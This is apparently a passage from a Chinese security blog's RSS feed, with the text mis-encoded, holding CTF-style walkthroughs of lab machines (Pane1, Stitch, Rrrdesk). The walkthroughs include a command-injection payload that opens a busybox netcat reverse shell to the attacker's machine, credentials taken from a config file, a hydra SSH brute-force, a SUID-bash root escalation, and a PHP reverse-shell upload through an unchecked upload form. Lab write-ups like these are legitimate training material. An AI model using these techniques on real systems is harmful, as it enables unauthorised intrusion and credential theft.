1PanelÁ±ª‰ººÁöÑËøêÁª¥Èù¢ÊùøÔºåÈÄöÂ∏∏ÊòØrootÁî®Êà∑Âú®Ë∑ëÔºåÊàëÊú¨Ë∫´ËØ¥‰∏ÄÊ≠•Âà∞‰ΩçÔºåÁõ¥Êé•‰ΩøÁî®ÁªàÁ´ØÂäüËÉΩÁöÑÔºå‰ΩÜÊòØÂÆÉÂ±ÖÁÑ∂ÊâæÊàëË¶ÅÂØÜÁ†ÅÔºåÊàëÂì™Êù•ÁöÑÂØÜÁ†ÅÁªô‰Ω†‚Åâ

ÈÇ£Êàë‰ª¨Âà©Áî®SSHÂØÜÈí•ÁÆ°ÁêÜÂäüËÉΩÊù•Ëé∑ÂèñÁßÅÈí•Âêß„ÄÇ

ËøõÂÖ•1PanelÂêéÂè∞ÔºåÂØºËà™Ëá≥ **Á≥ªÁªü &gt; SSHÁÆ°ÁêÜ &gt; ÂØÜÈí•ËÆ§ËØÅ**ÔºåÁîüÊàêÂØÜÈí•ÔºåÁÑ∂Âêéctrl+cÔºåctrl+v

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ vim id_rsa 
                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ chmod 600 id_rsa                
                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ ssh root@192.168.205.132 -i id_rsa
Linux Pane1 4.19.0-27-amd64 #1 SMP Debian 4.19.316-1 (2024-06-25) x86_64
...
Last login: Mon Aug 11 08:47:18 2025 from 192.168.3.94
root@Pane1:~# id
uid=0(root) gid=0(root) groups=0(root)
```

# Âõõ„ÄÅËé∑ÂèñFlag

```bash
root@Pane1:~# cat /root/root.txt
flag{root-e07910a06a086c83ba41827aa00b26ed}

root@Pane1:~# cat /home/kaada/user.txt
flag{user-ef68ba312de0daa3dd200a3f9275a6f6}
```

Ê≤°Âï•Â•ΩËØ¥ÁöÑÔºålow‰∏≠lowsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Pane1.html</guid><pubDate>Tue, 12 Aug 2025 14:22:11 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Stitch</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Stitch.html</link><description># ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` ÂØπÊú¨Âú∞ÁΩëÊÆµ `192.168.205.0/24` ËøõË°åÊâ´ÊèèÔºåÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.131 08:00:27:41:c8:f0       PCS Systemtechnik GmbH
...
```

Á°ÆËÆ§ÁõÆÊ†áIPÂú∞ÂùÄ‰∏∫ `192.168.205.131`„ÄÇ

## 2. Á´ØÂè£Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåËØÜÂà´ÂÖ∂ÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.131
...
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
...
```

Êâ´ÊèèÁªìÊûúÊòæÁ§∫ÁõÆÊ†áÂºÄÊîæ‰∫Ü **22 (SSH)** Âíå **80 (HTTP)** Á´ØÂè£„ÄÇ

## 3. Â≠êÂüüÂêçÊûö‰∏æ

ËÆøÈóÆ `http://192.168.205.131`ÔºåÂú®È°µÈù¢È°µËÑöÂèëÁé∞‰∏Ä‰∏™ËÅîÁ≥ªÈÇÆÁÆ± `support@stitch.dsz`„ÄÇÁî±Ê≠§Êé®Êñ≠Âá∫‰∏ªÂüüÂêç‰∏∫ `stitch.dsz`„ÄÇ

Êàë‰ª¨Â∞ÜIP‰∏é‰∏ªÂüüÂêçÁªëÂÆöÂú®Êú¨Âú∞ `/etc/hosts` Êñá‰ª∂‰∏≠„ÄÇ

```bash
192.168.205.131 stitch.dsz
```

ÈöèÂêéÔºå‰ΩøÁî® `wfuzz` ÂØπ‰∏ªÂüüÂêçËøõË°åËôöÊãü‰∏ªÊú∫ÔºàVHostÔºâÁàÜÁ†¥ÔºåÂèëÁé∞‰∫ÜÂ§ö‰∏™Â≠êÂüüÂêç„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ wfuzz -c -u 'http://stitch.dsz' -H 'HOST:FUZZ.stitch.dsz' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --hw 1348
...
=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================
000000002:   200        60 L     163 W      1822 Ch     'mail - mail'
000004858:   200        61 L     132 W      1751 Ch     'dog - dog'
000049948:   200        225 L    549 W      7295 Ch     'iot - iot'
...
```

ÂèëÁé∞ `mail.stitch.dsz`, `dog.stitch.dsz`, Âíå `iot.stitch.dsz` ‰∏â‰∏™Â≠êÂüüÂêç„ÄÇÂ∞ÜÂÆÉ‰ª¨ÂÖ®ÈÉ®Ê∑ªÂä†Âà∞ `/etc/hosts` Êñá‰ª∂‰∏≠‰ª•Êñπ‰æøÂêéÁª≠ËÆøÈóÆ„ÄÇ

## 4. WebÂ∫îÁî®ÂàÜÊûê

ÁªèËøáÂØπÊØè‰∏™Â∑≤ÂèëÁé∞Â≠êÂüüÁöÑÁõÆÂΩïÊûö‰∏æÂíåÂàùÊ≠•ÊµãËØïÔºåÊàë‰ª¨Â∞ÜÂÖ∂ÂÖ≥ÈîÆÁâπÂæÅÂíåÊΩúÂú®ÊîªÂáªÈù¢ÊÄªÁªìÂ¶Ç‰∏ãÔºö

*   **dog.stitch.dsz**: ‰∏Ä‰∏™ÂõæÁâá‰∏ä‰º†È°µÈù¢„ÄÇÈÄöËøáÁõÆÂΩïÁàÜÁ†¥ÂèëÁé∞ `/backup.zip`ÔºåÊ∫êÁ†ÅÂàÜÊûêË°®ÊòéÂÖ∂Â≠òÂú®‰∏•Ê†ºÁöÑMIMEÁ±ªÂûãÊ†°È™åÂíåÂõæÂÉè‰∫åÊ¨°Ê∏≤ÊüìÔºåÈöæ‰ª•Áõ¥Êé•Âà©Áî®‰∏ä‰º†ÊºèÊ¥û„ÄÇ
*   **mail.stitch.dsz**: ‰∏Ä‰∏™ÈùôÊÄÅÈÇÆ‰ª∂È°µÈù¢„ÄÇÁõÆÂΩïÁàÜÁ†¥ÂèëÁé∞ `mail.php`ÔºåËÆøÈóÆÂêéÂèëÁé∞ËØ•È°µÈù¢Á°¨ÁºñÁ†Å‰∫ÜÂØπ `/etc/passwd` Êñá‰ª∂ÁöÑËØªÂèñÔºåÂØºËá¥‰∫ÜÁ≥ªÁªüÁî®Êà∑ÂêçÂàóË°®ÁöÑÊ≥ÑÈú≤„ÄÇËøôÂπ∂ÈùûÈÄöÁî®Êñá‰ª∂ËØªÂèñÊºèÊ¥ûÔºå‰ΩÜ‰∏∫Êàë‰ª¨Êèê‰æõ‰∫ÜÂÖ≥ÈîÆÁöÑÊûö‰∏æ‰ø°ÊÅØ„ÄÇ
*   **iot.stitch.dsz**: ‰∏Ä‰∏™Áâ©ËÅîÁΩëÔºàIoTÔºâËÆæÂ§áÁôªÂΩïÈù¢Êùø„ÄÇÁªèËøáÊµãËØïÔºåÊ≠§Â§ÑÁöÑÁôªÂΩïË°®ÂçïÂ≠òÂú®**ÂëΩ‰ª§Ê≥®ÂÖ•**ÊºèÊ¥ûÔºåÊòØÊàë‰ª¨ÁöÑ‰∏ªË¶ÅÁ™ÅÁ†¥Âè£„ÄÇ

# ‰∫å„ÄÅÁ´ãË∂≥ÁÇπ

## 1. ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥û

`iot.stitch.dsz` ÁöÑÁôªÂΩïÈ°µÈù¢ÂêéÁ´ØÂ§ÑÁêÜÁî®Êà∑ËæìÂÖ•Êó∂Êú™ÂÅö‰∏•Ê†ºËøáÊª§ÔºåÂØºËá¥Âú® `username` ÂèÇÊï∞‰∏≠ÂèØ‰ª•Ê≥®ÂÖ•‰ªªÊÑèÁ≥ªÁªüÂëΩ‰ª§„ÄÇ

## 2. Ëé∑ÂèñÂèçÂêëShell

Êàë‰ª¨Âà©Áî®ËØ•ÂëΩ‰ª§Ê≥®ÂÖ•ÊºèÊ¥ûÔºåËÆ©ÁõÆÊ†á‰∏ªÊú∫ÊâßË°å‰∏ÄÊù°ÂèçÂºπshellÁöÑÂëΩ‰ª§„ÄÇ

* **Ê≠•È™§‰∏ÄÔºöÂú®KaliÊîªÂáªÊú∫‰∏äÁõëÂê¨Á´ØÂè£**

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
  ‚îî‚îÄ$ nc -lvnp 8888
  ```

* **Ê≠•È™§‰∫åÔºöÊûÑÈÄ†Âπ∂ÂèëÈÄÅPayload**
  Âú® `iot` ÁôªÂΩïÈ°µÈù¢ÁöÑ `username` ËæìÂÖ•Ê°Ü‰∏≠Â°´ÂÖ•‰ª•‰∏ãÁªèËøáURLÁºñÁ†ÅÁöÑPayloadÔºåÂØÜÁ†Å‰ªªÊÑèÂ°´ÂÜôÂêéÊèê‰∫§„ÄÇ

  ```
  ;busybox nc 192.168.205.128 8888 -e $(which $(echo $0));
  ```

* **Ê≠•È™§‰∏âÔºöÊàêÂäüÊé•Êî∂Shell**
  KaliÁöÑÁõëÂê¨Á´ØÂè£ÊàêÂäüÊé•Êî∂Âà∞Êù•Ëá™ÁõÆÊ†áÊúçÂä°Âô®ÁöÑÂèçÂêëshellÔºåÂΩìÂâçÁî®Êà∑‰∏∫ `www-data`„ÄÇ

  ```bash
  listening on [any] 8888 ...
  connect to [192.168.205.128] from (UNKNOWN) [192.168.205.131] 60340
  id
  uid=33(www-data) gid=33(www-data) groups=33(www-data)
  ```

* **Ê≠•È™§ÂõõÔºöÁ®≥ÂÆöShell**

  ```bash
  script /dev/null -c bash
  Ctrl+Z
  stty raw -echo; fg
  reset xterm
  export TERM=xterm
  export SHELL=/bin/bash
  stty rows 24 columns 80
  ```

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. Ê®™ÂêëÁßªÂä® (www-data -&gt; iiiii)

Âú® `www-data` Áî®Êà∑ÁöÑshell‰∏≠ÔºåÊàë‰ª¨ÂØπWebÁõÆÂΩïËøõË°åÊé¢Êü•ÔºåÂú® `dog` Â≠êÁ´ôÁÇπÁöÑÈÖçÁΩÆÊñá‰ª∂‰∏≠ÂèëÁé∞ÂÖ≥ÈîÆ‰ø°ÊÅØ„ÄÇ

```bash
www-data@Stitch:/var/www/dog$ cat config.php
&lt;?php
/*
 * IoT System Configuration File
 * Security Key: iiiii:3c4900896d92da
 * Last Updated: 2023-10-15
 */
// ... (ÂÖ∂‰ªñÈÖçÁΩÆ)
?&gt;
```

`config.php` Êñá‰ª∂Ê≥ÑÈú≤‰∫Ü‰∏Ä‰∏™Ê†ºÂºè‰∏∫ `username:password` ÁöÑÂÆâÂÖ®ÂØÜÈí•Ôºö`iiiii:3c4900896d92da`„ÄÇ

‰ΩøÁî®Ê≠§Âá≠ÊçÆÔºåÊàë‰ª¨ÊàêÂäü‰ªé `www-data` ÂàáÊç¢Âà∞ `iiiii` Áî®Êà∑ÔºåÂπ∂Ëé∑Âèñ‰∫ÜÁ¨¨‰∏Ä‰∏™flag„ÄÇ

```bash
www-data@Stitch:/var/www/dog$ su iiiii
Password: 3c4900896d92da
iiiii@Stitch:/var/www/dog$ id
uid=1000(iiiii) gid=1000(iiiii) groups=1000(iiiii)
iiiii@Stitch:~$ cat /home/iiiii/user.txt
flag{user-265620fc-3eda-11f0-b71d-000c2955ba04}
```

## 2. ÊèêÊùÉËá≥Root (iiiii -&gt; iotuser -&gt; root)

ËøôÊòØ‰∏Ä‰∏™Â§öÊ≠•È™§ÁöÑÊèêÊùÉËøáÁ®ãÔºåÈúÄË¶ÅÁªìÂêà‰∏§‰∏™Áî®Êà∑ÁöÑÊùÉÈôêÂíåÁ≥ªÁªüÈÖçÁΩÆÊâçËÉΩÂÆåÊàê„ÄÇ

* **Ê≠•È™§‰∏ÄÔºöÊùÉÈôêÂàÜÊûê (iiiii)**
  Âú® `iiiii` Áî®Êà∑‰∏ãÔºå‰ΩøÁî® `sudo -l` ÂèëÁé∞ÂÖ∂ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å `/usr/bin/push_iot`„ÄÇÈÄöËøá `strings` ÂàÜÊûêËØ•Á®ãÂ∫èÔºåÂæóÁü•ÂÖ∂ÂäüËÉΩÊòØÂ∞Ü‰∏Ä‰∏™Êñá‰ª∂Â§çÂà∂Âà∞ `/var/iot_scripts/` ÁõÆÂΩïÔºå‰ΩÜË¶ÅÊ±ÇÊ∫êÊñá‰ª∂ÊâÄÊúâËÄÖÂøÖÈ°ªÊòØ `iotuser`Ôºå‰∏îÊùÉÈôê‰∏∫ `600`ÔºåÊãíÁªùËΩØÈìæ„ÄÇËøô‰∏™ÈôêÂà∂Êù°‰ª∂Ëø´‰ΩøÊàë‰ª¨ÂøÖÈ°ªÂÖàËé∑Âæó `iotuser` ÁöÑÊéßÂà∂ÊùÉ„ÄÇ

* **Ê≠•È™§‰∫åÔºöÊ®™ÂêëÁßªÂä® (iiiii -&gt; iotuser)**
  Êàë‰ª¨ÂõûÂà∞‰πãÂâçÂèëÁé∞ÁöÑ `/var/www/dog/config.php` Êñá‰ª∂ÔºåÊî∂ÈõÜÂÖ∂‰∏≠ÊâÄÊúâÁúãËµ∑Êù•ÂÉèÂØÜÁ†ÅÁöÑÁ°¨ÁºñÁ†ÅÂ≠óÁ¨¶‰∏≤ÔºåÂàõÂª∫‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑÂØÜÁ†ÅÂ≠óÂÖ∏„ÄÇ

  ```bash
  ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
  ‚îî‚îÄ$ cat pass
  3c4900896d92da
  s3cur3P@ssw0rd!
  3c4900896d92da789abc
  sk_live_xyz123iiiii
  d3v!c3P@ss
  ```

‰ΩøÁî®Ëøô‰∏™Â≠óÂÖ∏Âíå `hydra` Â∑•ÂÖ∑ÔºåÂØπ `iotuser` ÁöÑSSHÊúçÂä°ËøõË°åÂØÜÁ†ÅÁàÜÁ†¥„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ hydra -l iotuser -P pass ssh://192.168.205.131 -f -I -u -e nsr -t 64
...
[22][ssh] host: 192.168.205.131   login: iotuser   password: 3c4900896d92da
...
```

ÊàêÂäüÁ†¥Ëß£Âá∫ `iotuser` ÁöÑÂØÜÁ†Å‰πüÊòØ `3c4900896d92da`„ÄÇ‰ΩøÁî®Ê≠§ÂØÜÁ†ÅÈÄöËøáSSHÊàêÂäüÁôªÂΩï„ÄÇ

* **Ê≠•È™§‰∏âÔºöÊèêÊùÉË∑ØÂæÑÂèëÁé∞ (iotuser)**
  ÁôªÂΩï `iotuser` ÂêéÔºåÂÜçÊ¨°ÊâßË°å `sudo -l`ÔºåÂèëÁé∞Êñ∞Á∫øÁ¥¢Ôºö

  ```bash
  iotuser@Stitch:~$ sudo -l
  ...
  User iotuser may run the following commands on Stitch:
      (ALL) NOPASSWD: /usr/bin/iot_runner
  ```

  `iotuser` ÂèØ‰ª•Êó†ÂØÜÁ†Å‰ª•rootÊùÉÈôêÊâßË°å `/usr/bin/iot_runner`ÔºåËØ•ËÑöÊú¨‰ºöÊâßË°å‰Ωç‰∫é `/var/iot_scripts/` ÁõÆÂΩï‰∏ãÁöÑÊåáÂÆöËÑöÊú¨„ÄÇËá≥Ê≠§ÔºåÂÆåÊï¥ÁöÑÊèêÊùÉÈìæÂ∑≤ÁªèÊ∏ÖÊô∞Ôºö

  1.  ‰ª• `iotuser` Ë∫´‰ªΩÂàõÂª∫‰∏Ä‰∏™ÂåÖÂê´ÊèêÊùÉ‰ª£Á†ÅÁöÑÊÅ∂ÊÑèËÑöÊú¨„ÄÇ
  2.  ‰ª• `iiiii` Ë∫´‰ªΩ‰ΩøÁî® `push_iot` Â∞ÜÊ≠§ÊÅ∂ÊÑèËÑöÊú¨Â§çÂà∂Âà∞ `/var/iot_scripts/`„ÄÇ
  3.  ÊúÄÂêé‰ª• `iotuser` Ë∫´‰ªΩ‰ΩøÁî® `iot_runner` ÊâßË°åËØ•ËÑöÊú¨ÔºåÂÆåÊàêÊèêÊùÉ„ÄÇ

* **Ê≠•È™§ÂõõÔºöÊâßË°åÊèêÊùÉ**

  1. **‰Ωú‰∏∫ `iotuser`**ÔºåÂú®ÂÖ±‰∫´ÁõÆÂΩï `/dev/shm/` ‰∏ãÂàõÂª∫ÊèêÊùÉËÑöÊú¨ `a.sh`ÔºåÂÜÖÂÆπ‰∏∫Áªô `bash` Ê∑ªÂä†SUIDÊùÉÈôêÔºåÂπ∂ËÆæÁΩÆÂÖ∂ÊùÉÈôê‰∏∫ `600` ‰ª•Êª°Ë∂≥ `push_iot` ÁöÑÊ£ÄÊü•Êù°‰ª∂„ÄÇ

     ```bash
     iotuser@Stitch:~$ vim /dev/shm/a.sh
     iotuser@Stitch:~$ cat /dev/shm/a.sh
     IOT#
     chmod +s /bin/bash
     iotuser@Stitch:~$ chmod 600 /dev/shm/a.sh
     ```

  2. **ÂàáÊç¢Âõû `iiiii` Áî®Êà∑**ÔºåÊâßË°å `push_iot` ÂëΩ‰ª§„ÄÇ

     ```bash
     iiiii@Stitch:/tmp$ sudo /usr/bin/push_iot /dev/shm/a.sh
     All checks passed. Copying file...
     File successfully copied to /var/iot_scripts/a.sh
     ```

  3. **ÂÜçÊ¨°ÂàáÊç¢Âõû `iotuser`**ÔºåÊâßË°å `iot_runner` Ëß¶Âèëpayload„ÄÇ

     ```bash
     iotuser@Stitch:~$ sudo /usr/bin/iot_runner a.sh
     Checking script: /var/iot_scripts/a.sh
     Verification passed.:
     ```

  4. Ê£ÄÊü• `/bin/bash` ÊùÉÈôêÔºåÂèëÁé∞Â∑≤ÊàêÂäüËÆæÁΩÆSUID‰Ωç„ÄÇÊâßË°å `bash -p` Ëé∑ÂæórootÊùÉÈôê„ÄÇ

     ```bash
     iotuser@Stitch:~$ ls -al /bin/bash
     -rwsr-sr-x 1 root root 1168776 Apr 18  2019 /bin/bash
     iotuser@Stitch:~$ bash -p
     bash-5.0# id
     uid=1004(iotuser) gid=1004(iotuser) euid=0(root) egid=0(root) groups=0(root),1004(iotuser)
     ```

# Âõõ„ÄÅËé∑ÂèñFlag

```bash
bash-5.0# id
uid=1004(iotuser) gid=1004(iotuser) euid=0(root) egid=0(root) groups=0(root),1004(iotuser)
bash-5.0# cat /root/root.txt /home/iiiii/user.txt 
flag{root-251f332a-3ed6-11f0-960d-000c2955ba04}
flag{user-265620fc-3eda-11f0-b71d-000c2955ba04}
```

Ëá≥Ê≠§ÔºåÊâÄÊúâFlagÂùáÂ∑≤ÊâæÂà∞ÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_Stitch.html</guid><pubDate>Tue, 12 Aug 2025 02:04:54 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Rrrdesk</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Rrrdesk.html</link><description># **‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ**

## **1. ‰∏ªÊú∫ÂèëÁé∞**

È¶ñÂÖàÔºå‰ΩøÁî® `arp-scan` Âú® `192.168.205.0/24` ÁΩëÊÆµ‰∏≠Êâ´ÊèèÂ≠òÊ¥ª‰∏ªÊú∫ÔºåÁ°ÆÂÆöÁõÆÊ†áIPÂú∞ÂùÄ„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
...
192.168.205.132 08:00:27:cf:26:10       PCS Systemtechnik GmbH
...
```

ÂëΩ‰ª§ËæìÂá∫Á°ÆËÆ§‰∫ÜÁõÆÊ†á‰∏ªÊú∫ÁöÑIPÂú∞ÂùÄ‰∏∫ `192.168.205.132`„ÄÇ

## **2. Á´ØÂè£Êâ´Êèè**

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ `192.168.205.132` ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºå‰ª•ËØÜÂà´ÂØπÂ§ñÂºÄÊîæÁöÑÊúçÂä°„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.132
...
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3389/tcp open  ms-wbt-server
...
```

Êâ´ÊèèÁªìÊûúË°®ÊòéÔºåÁõÆÊ†á‰∏ªÊú∫ÂºÄÊîæ‰∫Ü **22 (SSH)**„ÄÅ**80 (HTTP)** Âíå **3389 (RDP)** Á´ØÂè£„ÄÇÊàë‰ª¨È¶ñÂÖà‰ªéWebÊúçÂä°ÂÖ•Êâã„ÄÇ

## **3. Web‰ø°ÊÅØÊé¢Êµã**

ËÆøÈóÆ `http://192.168.205.132` ÊòØ‰∏Ä‰∏™Êñá‰ª∂‰∏ä‰º†È°µÈù¢„ÄÇ‰ΩøÁî® `gobuster` ËøõË°åÁõÆÂΩïÊâ´ÊèèÔºåÂèëÁé∞‰∫Ü‰∏Ä‰∏™ÂèØÁñëÁöÑÂ§á‰ªΩÊñá‰ª∂ `back.zip`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.132 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html,zip,db,bak -t 64
...
/uploads              (Status: 301) [Size: 320] [--&gt; http://192.168.205.132/uploads/]
/upload.php           (Status: 302) [Size: 0] [--&gt; index.php]
/back.zip             (Status: 200) [Size: 911]
/index.php            (Status: 200) [Size: 14529]
...
```

‰∏ãËΩΩÂπ∂Ëß£Âéã `back.zip` Êñá‰ª∂ÔºåËé∑ÂèñÂà∞ÁΩëÁ´ôÁöÑÊ∫êÁ†Å `upload.php` Âíå `index.php`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ wget http://192.168.205.132/back.zip
...
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ unzip back.zip 
Archive:  back.zip
  inflating: upload.php              
  inflating: index.php
```

# **‰∫å„ÄÅWebÊ∏óÈÄè‰∏éÁ´ãË∂≥ÁÇπ**

## **1. ÊºèÊ¥ûÂàÜÊûê**

ÈÄöËøáÂÆ°ËÆ° `upload.php` ÁöÑÊ∫ê‰ª£Á†ÅÔºåÊàë‰ª¨ÂèëÁé∞‰∫ÜÂÖ∂Ê†∏ÂøÉÂ§ÑÁêÜÈÄªËæëÔºö

```php
&lt;?php
$upload_dir = '/var/www/webdav/uploads/';
$filename = $_FILES['file']['name'];
$tmp_name = $_FILES['file']['tmp_name'];

if (!empty($filename)) {
    // ÁîüÊàêMD5Êñá‰ª∂ÂêçÔºà‰øùÁïôÂéüÊâ©Â±ïÂêçÔºâ
    $file_ext = pathinfo($filename, PATHINFO_EXTENSION);
    $new_name = md5(pathinfo($filename, PATHINFO_FILENAME)) . ($file_ext ? '.$file_ext' : '');
    
    // ÁßªÂä®Êñá‰ª∂Âà∞‰∏ä‰º†ÁõÆÂΩï
    if (move_uploaded_file($tmp_name, $upload_dir . $new_name)) {
        echo 'Upload ok';
    } else {
        echo 'Êñá‰ª∂‰∏ä‰º†Â§±Ë¥•ÔºÅ';
    }
} else {
    header('Location: index.php');
}
?&gt;
```

‰ª£Á†ÅÈÄªËæëÂ≠òÂú®ÊòéÊòæÁöÑ‰ªªÊÑèÊñá‰ª∂‰∏ä‰º†ÊºèÊ¥û„ÄÇÂÆÉÂ∞Ü‰∏ä‰º†Êñá‰ª∂ÁöÑÊñá‰ª∂ÂêçÔºà‰∏çÂê´Êâ©Â±ïÂêçÔºâËøõË°åMD5ÂìàÂ∏åÔºåÁÑ∂ÂêéÊãºÊé•‰∏äÂéüÂßãÊâ©Â±ïÂêçÔºåÂ≠òÂÇ®Âà∞ `/var/www/webdav/uploads/` ÁõÆÂΩï‰∏ã„ÄÇÁî±‰∫éÊ≤°ÊúâÂØπÊñá‰ª∂Á±ªÂûãÊàñÂÜÖÂÆπÂÅö‰ªª‰ΩïÊ£ÄÊü•ÔºåÊàë‰ª¨ÂèØ‰ª•‰∏ä‰º†‰∏Ä‰∏™PHPÂèçÂºπShell„ÄÇ

## **2. Getshell**

**Âà©Áî®Ê≠•È™§:**

1. ÂàõÂª∫‰∏Ä‰∏™Âêç‰∏∫ `reverse.php` ÁöÑÂèçÂºπShellÊñá‰ª∂„ÄÇ

2. ËÆ°ÁÆóÊñá‰ª∂Âêç 'reverse' ÁöÑMD5ÂÄº„ÄÇ

   ```bash
   ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
   ‚îî‚îÄ$ echo -n 'reverse' |md5sum                           
   4d9c2073afa3c2abb817dceb22c34de6  -
   ```

   ‰∏ä‰º†ÂêéÁöÑÊñá‰ª∂Â∞ÜË¢´ÂëΩÂêç‰∏∫ `4d9c2073afa3c2abb817dceb22c34de6.php`„ÄÇ

3. Âú®ÊîªÂáªÊú∫ÔºàKaliÔºâ‰∏äÂºÄÂêØ `netcat` ÁõëÂê¨ `4444` Á´ØÂè£„ÄÇ

4. ÈÄöËøáWebÈ°µÈù¢‰∏ä‰º† `reverse.php` Êñá‰ª∂„ÄÇ

5. Âú®ÊµèËßàÂô®Êàñ‰ΩøÁî® `curl` ËÆøÈóÆ `http://192.168.205.132/uploads/4d9c2073afa3c2abb817dceb22c34de6.php`„ÄÇ

6. ÊîªÂáªÊú∫ÊàêÂäüÊé•Êî∂Âà∞ÂèçÂºπShellÔºåËé∑Âæó `www-data` Áî®Êà∑ÊùÉÈôê„ÄÇ

# **‰∏â„ÄÅÊùÉÈôêÊèêÂçá**

## **1. Ê®™ÂêëÁßªÂä® (www-data -&gt; lemon)**

Âú® `www-data` ÁöÑShell‰∏≠ÔºåÊàë‰ª¨Ê£ÄÊü• `/home` ÁõÆÂΩïÔºåÂèëÁé∞‰∫Ü `lemon` Âíå `welcome` ‰∏§‰∏™Áî®Êà∑„ÄÇÈÄöËøáÁøªÈòÖ `lemon` Áî®Êà∑ÂÆ∂ÁõÆÂΩï‰∏ãÁöÑ `.bash_history` Êñá‰ª∂ÔºåÊàë‰ª¨ÂèëÁé∞‰∫Ü‰∏ÄÊù°ÂèØÁñëËÆ∞ÂΩï„ÄÇ

```bash
www-data@Rrrdesk:/home/lemon$ cat .bash_history
...
echo speaker | md5sum
...
```

ËøôÂº∫ÁÉàÊöóÁ§∫Áî®Êà∑ `lemon` ÁöÑÂØÜÁ†ÅÂèØËÉΩÊòØ `speaker`„ÄÇ

ÊàëÂÖàÂ∞ùËØï‰∫ÜsuÂàáÊç¢Áî®Êà∑Ôºå‰ΩÜÊòØËØ•Á≥ªÁªüÊ≤°ÊúâsuÔºåÁÑ∂ÂêéÂ∞ùËØï‰ΩøÁî®SSHËøûÊé•ÔºåËôΩÁÑ∂ `nmap` Êâ´ÊèèÊòæÁ§∫SSHÊúçÂä°ÂºÄÊîæÔºå‰ΩÜÂ∞ùËØï‰ΩøÁî® `lemon:speaker` ÁôªÂΩïSSHÂ§±Ë¥•ÔºåÊúâÁÇπÊÄÄÁñëÊòØSSHÈÖçÁΩÆÈôêÂà∂‰∫ÜËØ•Áî®Êà∑ÁöÑÁôªÂΩïÔºàÂâçÊÆµÊó∂Èó¥ÔºåÁæ§‰∏ªËÅäËøáÁõ∏ÂÖ≥ÁöÑËØùÈ¢òÔºåÊàëÁúã‰∫ÜÂá†Áúº„ÄÇÁªèËøáÈ™åËØÅÔºåÁ°ÆÂÆûÊòØsshÁöÑÈÖçÁΩÆÊñá‰ª∂ÈôêÂà∂‰∫Ü`welcome`„ÄÅ`lemon`Áî®Êà∑ÁöÑÁôªÂΩïÔºâ„ÄÇ

ÁÑ∂ËÄåÔºåÁ´ØÂè£Êâ´Êèè‰πüÂèëÁé∞‰∫ÜÂºÄÊîæÁöÑ **3389 (RDP)** Á´ØÂè£„ÄÇÊàë‰ª¨Â∞ùËØï‰ΩøÁî®ËØ•Âá≠ÊçÆËøõË°åRDPËøûÊé•„ÄÇ

*ps:ËøôÈáåÊàëÊâìÁöÑË∑ØÁ∫ø‰∏çÊòØ3389ÔºåÊàëÊòØÁõ¥Êé•Âú®Èù∂Êú∫ÁôªÂΩï‰∫ÜÔºå‰ΩÜÊòØËøô‰∏™ÊÄùË∑ØÊòØÁäØËßÑÁöÑüòÄ„ÄÇ*

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ rdesktop -u lemon 192.168.205.132
```

